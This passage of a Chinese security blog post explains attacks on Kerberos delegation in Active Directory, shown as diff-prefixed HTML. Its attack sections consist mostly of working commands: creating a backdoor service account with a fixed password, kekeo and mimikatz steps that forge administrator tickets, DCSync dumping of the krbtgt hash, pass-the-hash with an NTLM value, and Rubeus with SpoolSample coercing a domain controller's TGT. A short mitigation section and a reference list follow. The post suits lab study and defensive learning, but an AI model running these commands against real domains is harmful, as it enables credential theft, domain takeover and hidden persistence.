+<p>tgs服务的spn为krbtgt/LAB.LOCAL，该服务以krbtgt服务账户运行的</p>
+<hr>
+<p><strong>小插曲</strong></p>
+<p>最初我测试这个变种黄金票据的时候是在Windows 2012域环境下测试，一直不成功</p>
+<p>看SPN或Kerberos协议数据包也没看出什么问题</p>
+<p>后来问了一下n1nty师傅，说是2012 及以后的KDC，受限委派的机制变成了Resource Based Constrained Delegation，有可能是这个原因</p>
+<p>于是换成2008的域环境进行测试，果然可以成功</p>
+<p>而关于如何在2012及以后的域控上实现黄金票据，我研究了好久也没能搞定，有知道的师傅求教Orz...</p>
+<p>所以下面的测试环境换为</p>
+<p>域 dlive.com</p>
+<p>域控 Windows Server 2008 DC1.dlive.com</p>
+<p>域管理员 DLIVE\Administrator</p>
+<p>攻击者 Win7 内置用户 WIN7\dtz</p>
+<hr>
+<p>变种黄金票据的流程如下</p>
+<p><strong>一、在获取域管理员权限之后，添加服务账户backdoor_svc，开启非限制委派，服务类型为krbtgt/DLIVE.COM</strong></p>
+<p>关于tgs服务的spn:</p>
+<p>我们在域控上执行klist查看到任何一个域用户的TGT票据即可以发现，tgs服务的spn为krbtgt/DLIVE.COM</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234559-e9124b96-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234559-e9124b96-d2ec-1.png" alt="img"></a></p>
+<p>1.添加服务账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ADUser -Name &quot;Backdoor&quot; -SamAccountName backdoor_svc -UserPrincipalName backdoor_svc@dlive.com -ServicePrincipalNames &quot;backdoor/backdoor.dlive.com&quot; -AccountPassword (convertto-securestring &quot;Dubhe@1234&quot; -asplaintext -force)  -PasswordNeverExpires $True  -PassThru | Enable-ADAccount</span><br></pre></td></tr></table></figure>
+
+<p>2.设置委派</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$user = Get-ADUser backdoor_svc -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line"></span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/DLIVE.COM&quot;) &#125;</span><br><span class="line"></span><br><span class="line">Set-ADAccountControl $user -TrustedToAuthForDelegation $true</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234608-edf4a690-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234608-edf4a690-d2ec-1.png" alt="img"></a></p>
+<p><strong>二、攻击者通过已知的backdoor_svc口令，使用kekeo tgt::ask，获取backdoor_svc tgt</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:backdoor_svc /domain:dlive.com /password:Dubhe@1234&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234616-f32eb8d0-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234616-f32eb8d0-d2ec-1.png" alt="img"></a></p>
+<p><strong>三、攻击者通过kekeo tgs::s4u，获取DLIVE\Administrator访问krbtgt/DLIVE.COM的TGS，即DLIVE\Administrator的TGT</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_backdoor_svc@DLIVE.COM_krbtgt~dlive.com@DLIVE.COM.kirbi /user:Administrator@dlive.com /service:krbtgt/DLIVE.COM&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234624-f7f45bae-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234624-f7f45bae-d2ec-1.png" alt="img"></a></p>
+<p><strong>四、攻击者利用获取的域管理员的TGT控制域控制器</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@dlive.com@DLIVE.COM_krbtgt~DLIVE.COM@DLIVE.COM.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234632-fcc221b6-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234632-fcc221b6-d2ec-1.png" alt="img"></a></p>
+<p>klist查看缓存的票据</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234638-0010df42-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234638-0010df42-d2ed-1.png" alt="img"></a></p>
+<p>以域管理员的身份访问域控</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234645-040b5f6e-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234645-040b5f6e-d2ed-1.png" alt="img"></a></p>
+<h2 id="受限委派-DCSync-域控权限维持"><a href="#受限委派-DCSync-域控权限维持" class="headerlink" title="受限委派 + DCSync 域控权限维持"></a>受限委派 + DCSync 域控权限维持</h2><p>变种黄金票据在2012之后的域环境下没有试验成功</p>
+<p>但是在2012及之后的域环境下还是有其他办法可以通过受限委派进行持久化控制的</p>
+<p>这里利用了DC上的ldap服务，通过受限委派获取ldap服务的票据进行DCSync攻击</p>
+<p>参考：<a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a></p>
+<p>1.给后门服务账户设置委派</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;ldap/DC2.lab.local&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.申请以<code>LAB\Administrator</code>身份访问ldap/DC2.lab.local的TGS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:backdoor_svc /domain:dlive.com /password:Dubhe@1234&quot; exit</span><br><span class="line"></span><br><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_backdoor_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:ldap/DC2.lab.local&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>3.mimikatz将TGS写入内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_ldap~DC2.lab.local@LAB.LOCAL.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>4.DCSync读取<strong>krbtgt</strong>的HASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /user:krbtgt /domain:lab.local&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234655-0a5ccf9c-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234655-0a5ccf9c-d2ed-1.png" alt="img"></a></p>
+<p>5.下面就可以通过<strong>krbtgt</strong>伪造黄金票据了</p>
+<p>也可以直接通过<strong>dcsync</strong>读取LAB\Administrator的HASH进行PTH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:9492fbc31a047a42a454f0e1701103dc /run:cmd.exe&quot; exit</span><br></pre></td></tr></table></figure>
+
+<h2 id="非受限委派-Print-Spooler服务-域控权限获取-权限维持"><a href="#非受限委派-Print-Spooler服务-域控权限获取-权限维持" class="headerlink" title="非受限委派 + Print Spooler服务 域控权限获取/权限维持"></a>非受限委派 + Print Spooler服务 域控权限获取/权限维持</h2><p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/2896" target="_blank" rel="noopener">https://xz.aliyun.com/t/2896</a></p>
+<p><a href="https://adsecurity.org/?p=4056" target="_blank" rel="noopener">https://adsecurity.org/?p=4056</a></p>
+<p><a href="https://www.youtube.com/watch?v=-bcWZQCLk_4&amp;feature=youtu.be&amp;t=2194" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-bcWZQCLk_4&amp;feature=youtu.be&amp;t=2194</a></p>
+<p><a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory" target="_blank" rel="noopener">https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory</a></p>
+<p>在已经控制一台非受限委派机器的情况下，攻击者可以提取该机器中缓存的TGT，但是如果域管理员未曾访问过该机器，攻击者没办法获取到域管的TGT</p>
+<p>在DerbyCon 8（2018年）会议上，Will Schroeder (@Harmj0y)、Lee Christensen (@Tifkin_)和Matt Nelson (@enigma0x3)提出了一种场景，当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。</p>
+<p>但是这种攻击有一个限制是<strong>需要找到一台开启非受限委派的主机账户，而非服务账户</strong>。</p>
+<p>在一些网络环境下开启非受限委派的主机账户可能不是很好找，DerbyCon 8该攻击方法的作者是以SHAREPOINT主机为例演示的。虽然开启非受限委派的主机账户可能不是很好找，但是这种方式仍然可以用作一种权限维持方式。</p>
+<p>1.首先开启DESKTOP-WIN10主机账户的非受限委派</p>
+<p>域控DC2上Print Spooler服务<strong>默认</strong>是自动运行的，下图是该服务的截图</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234710-12ec99bc-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234710-12ec99bc-d2ed-1.png" alt="img"></a></p>
+<p>攻击者现在已经拿下DESKTOP-WIN10的控制权限</p>
+<p>最近harmj0y大佬发布了基于C#的Rubeus来弥补kekeo工具的一些不足</p>
+<p>2.这里使用Rubeus的监听模式，监听登录会话<strong>提取TGT</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 以管理员身份运行</span><br><span class="line"></span><br><span class="line">Rubeus.exe monitor /interval:5 /filteruser:DC2$</span><br></pre></td></tr></table></figure>
+
+<p>3.向DC2 Print Spooler发送请求，强制其访问DESKTOP-WIN10进行身份验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 以域用户身份运行</span><br><span class="line"></span><br><span class="line">SpoolSample_v4.5_x64.exe DC2 DESKTOP-WIN10</span><br></pre></td></tr></table></figure>
+
+<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ol>
+<li>不需要使用委派的账户或高权限用户，比如域管理员账户，设置不允许委派</li>
+</ol>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234718-1829a80c-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234718-1829a80c-d2ed-1.png" alt="img"></a></p>
+<ol>
+<li>受保护的用户组</li>
+</ol>
+<p>适用于Windows 2012 R2以及更高版本的系统</p>
+<p>参考：<br><a href="https://docs.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/protected-users-security-group#BKMK_HowItWorks" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/protected-users-security-group#BKMK_HowItWorks</a><br><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts</a></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234732-203ae786-d2ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234732-203ae786-d2ed-1.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">If the domain functional level is Windows Server 2012 R2 , members of the group can no longer:</span><br><span class="line"></span><br><span class="line">- Authenticate by using NTLM authentication</span><br><span class="line"></span><br><span class="line">- Use Data Encryption Standard (DES) or RC4 cipher suites in Kerberos pre-authentication</span><br><span class="line"></span><br><span class="line">- Be delegated by using unconstrained or constrained delegation</span><br><span class="line"></span><br><span class="line">- Renew user tickets (TGTs) beyond the initial 4-hour lifetime</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.无约束委派攻击</p>
+<p><a href="https://adsecurity.org/?p=1667" target="_blank" rel="noopener">https://adsecurity.org/?p=1667</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/9268346.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9268346.html</a></p>
+<p><a href="https://www.labofapenetrationtester.com/2016/02/getting-domain-admin-with-kerberos-unconstrained-delegation.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2016/02/getting-domain-admin-with-kerberos-unconstrained-delegation.html</a></p>
+<p>2.约束委派相关协议(s4u2self/s4u2proxy)MSDN</p>
+<p><a href="https://msdn.microsoft.com/en-us/library/cc246080.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/cc246080.aspx</a></p>
+<p>3.约束委派攻击</p>
+<p><a href="https://www.anquanke.com/post/id/92484#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484#h2-0</a></p>
+<p><a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a></p>
+<p><a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a></p>
+<p><a href="https://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day3.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day3.html</a></p>
+<p>4.基于域委派的变种黄金票据</p>
+<p><a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></p>
+<p>5.Blackhat US 2015 提出关于非受限委派的攻击手法</p>
+<p><a href="https://adsecurity.org/?p=1667" target="_blank" rel="noopener">https://adsecurity.org/?p=1667</a></p>
+<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection.pdf</a></p>
+<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf</a></p>
+<p>6.Blackhat Asia 2017 提出关于受限委派的攻击手法</p>
+<p><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE.pdf</a></p>
+<p><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE-wp.pdf</a></p>
+<p>7.攻击者是如何通过域控制器打印机服务和无约束Kerberos委派账户获取最高权限的</p>
+<p><a href="https://xz.aliyun.com/t/2896" target="_blank" rel="noopener">https://xz.aliyun.com/t/2896</a></p>
+<p><a href="https://adsecurity.org/?p=4056" target="_blank" rel="noopener">https://adsecurity.org/?p=4056</a></p>
+<p><a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory" target="_blank" rel="noopener">https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory</a></p>
+<p>8.受保护的用户组</p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/protected-users-security-group#BKMK_HowItWorks" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/security/credentials-protection-and-management/protected-users-security-group#BKMK_HowItWorks</a><br><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts</a></p>
+<p>转自：<a href="http://d1iv3.me/2018/09/24/Attack-Kerberos-Delegation/#0x03-攻击受限委派（Constrained-Delegation）" target="_blank" rel="noopener">http://d1iv3.me/2018/09/24/Attack-Kerberos-Delegation/#0x03-%E6%94%BB%E5%87%BB%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE%EF%BC%88Constrained-Delegation%EF%BC%89</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/12/29/Attack-Kerberos-Delegation/" title="Attack Kerberos Delegation">https://wh0ale.github.io/2019/12/29/Attack-Kerberos-Delegation/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i># 域渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/16/Offensive域环境靶场渗透/" rel="next" title="Offensive域环境靶场渗透">
+                <i class="fa fa-chevron-left"></i> Offensive域环境靶场渗透
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">126</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#脆弱点发现"><span class="nav-number">1.</span> <span class="nav-text">脆弱点发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击非受限委派（Unconstrained-Delegation）"><span class="nav-number">2.</span> <span class="nav-text">攻击非受限委派（Unconstrained Delegation）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击受限委派（Constrained-Delegation）"><span class="nav-number">3.</span> <span class="nav-text">攻击受限委派（Constrained Delegation）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用受限委派制作变种黄金票据"><span class="nav-number">4.</span> <span class="nav-text">使用受限委派制作变种黄金票据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#受限委派-DCSync-域控权限维持"><span class="nav-number">5.</span> <span class="nav-text">受限委派 + DCSync 域控权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#非受限委派-Print-Spooler服务-域控权限获取-权限维持"><span class="nav-number">6.</span> <span class="nav-text">非受限委派 + Print Spooler服务 域控权限获取/权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓解措施"><span class="nav-number">7.</span> <span class="nav-text">缓解措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">8.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22:43</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
